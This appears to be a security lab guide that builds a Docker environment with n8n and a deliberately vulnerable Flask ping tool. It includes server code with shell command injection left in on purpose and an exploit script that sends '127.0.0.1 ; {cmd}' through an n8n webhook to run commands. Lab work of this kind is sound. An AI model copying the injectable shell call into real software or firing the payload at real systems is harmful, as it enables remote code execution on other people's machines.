# üß™ Lab Guide: CVE-2026-21877 Setup

This lab demonstrates the exploitation of a system orchestrated by n8n. The environment is configured to use a vulnerable version of n8n to showcase how security flaws in automation pipelines can lead to downstream Remote Code Execution (RCE).

## üöÄ Step 1: Setup Instructions

### üõ†Ô∏è Prerequisites: Install Docker and Docker Compose

If Docker is not installed on your system (Debian/Ubuntu), follow these steps to install the Docker Engine and the Compose plugin.

### 1. docker-compose.yml

```yaml
version: '3.8'

services:
  vulnerable-app:
    build: .
    container_name: vulnerable-app
    ports:
      - "5000:5000"
    networks:
      - lab-net

  n8n:
    image: n8nio/n8n:1.121.0
    container_name: n8n-lab
    ports:
      - "5678:5678"
    environment:
      - N8N_HOST=localhost
      - N8N_PORT=5678
      - N8N_PROTOCOL=http
      - WEBHOOK_URL=http://localhost:5678/
      - N8N_METRICS=true
      - N8N_DIAGNOSTICS_ENABLED=false
    volumes:
      - n8n_data:/home/node/.n8n
    networks:
      - lab-net
    depends_on:
      - vulnerable-app

networks:
  lab-net:
    driver: bridge

volumes:
  n8n_data:

```

### 2. Dockerfile

```dockerfile
FROM python:3.9-slim
WORKDIR /app
RUN pip install flask
COPY target_server.py .
EXPOSE 5000
CMD ["python", "target_server.py"]

```

### 3. target_server.py

```python
from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<body>
    <h1>NetView Pro v4.2 - Diagnostic Tool</h1>
    <form method="POST">
        <input type="text" name="target" placeholder="IP Address" required>
        <button type="submit">Ping</button>
    </form>
    {% if result %}<pre>{{ result }}</pre>{% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    result = ""
    if request.method == 'POST':
        target = request.form.get('target')
        # VULNERABLE: Direct shell concatenation
        command = f"ping -c 2 {target}"
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            result = output
        except Exception as e:
            result = str(e)
    return render_template_string(HTML_TEMPLATE, result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

### 4. n8n_workflow_cve.json

```json
{
  "nodes": [
    {
      "parameters": {"path": "diagnostic-gate", "options": {}},
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 1,
      "position": [250, 300]
    },
    {
      "parameters": {
        "method": "POST",
        "url": "http://vulnerable-app:5000/",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [{"name": "target", "value": "={{ $json.body.address }}"}]
        }
      },
      "name": "HTTP Request",
      "type": "n8n-nodes-base.httpRequest",
      "typeVersion": 4.1,
      "position": [470, 300]
    }
  ],
  "connections": {
    "Webhook": {"main": [[{"node": "HTTP Request", "type": "main", "index": 0}]]}
  }
}

```

### 5. exploit_n8n.py

```python
import requests

N8N_URL = "http://localhost:5678/webhook-test/diagnostic-gate"

def attack(cmd):
    payload = {"address": f"127.0.0.1 ; {cmd}"}
    r = requests.post(N8N_URL, json=payload)
    print(f"Result of {cmd}:")
    print(r.text)

if __name__ == "__main__":
    attack("id")

```

### Install Docker
```bash
sudo apt update
sudo apt install --yes apt-transport-https ca-certificates curl gnupg2 software-properties-common
curl -fsSL [https://download.docker.com/linux/debian/gpg](https://download.docker.com/linux/debian/gpg) | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] [https://download.docker.com/linux/debian](https://download.docker.com/linux/debian) $(lsb_release -cs) stable"
sudo apt update
sudo apt install --yes docker-ce

```

#### 2. Install Docker Compose Plugin

```bash
sudo apt update
sudo apt install --yes docker-compose-plugin

```

#### 3. Initialize the Lab Containers

```bash
docker compose up -d

```
